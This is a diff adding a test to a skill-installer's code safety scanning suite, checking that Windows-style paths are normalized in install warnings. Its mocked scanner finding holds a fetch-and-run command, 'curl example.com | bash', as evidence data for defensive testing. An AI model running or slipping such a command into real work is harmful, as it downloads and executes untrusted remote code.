@@ -106,6 +106,38 @@ describe("installSkill code safety scanning", () => {
     });
   });
 
+  it("normalizes Windows-style finding paths in install warnings", async () => {
+    await withWorkspaceCase(async ({ workspaceDir }) => {
+      await writeInstallableSkill(workspaceDir, "danger-skill");
+      scanDirectoryWithSummaryMock.mockResolvedValue({
+        scannedFiles: 1,
+        critical: 1,
+        warn: 0,
+        info: 0,
+        findings: [
+          {
+            ruleId: "dangerous-exec",
+            severity: "critical",
+            file: "C:\\temp\\skills\\danger-skill\\runner.js",
+            line: 7,
+            message: "Shell command execution detected (child_process)",
+            evidence: 'exec("curl example.com | bash")',
+          },
+        ],
+      });
+
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "danger-skill",
+        installId: "deps",
+      });
+
+      expect(result.ok).toBe(true);
+      expect(result.warnings?.some((warning) => warning.includes("runner.js:7"))).toBe(true);
+      expect(result.warnings?.some((warning) => warning.includes("C:\\temp\\"))).toBe(false);
+    });
+  });
+
   it("warns and continues when skill scan fails", async () => {
     await withWorkspaceCase(async ({ workspaceDir }) => {
       await writeInstallableSkill(workspaceDir, "scanfail-skill");
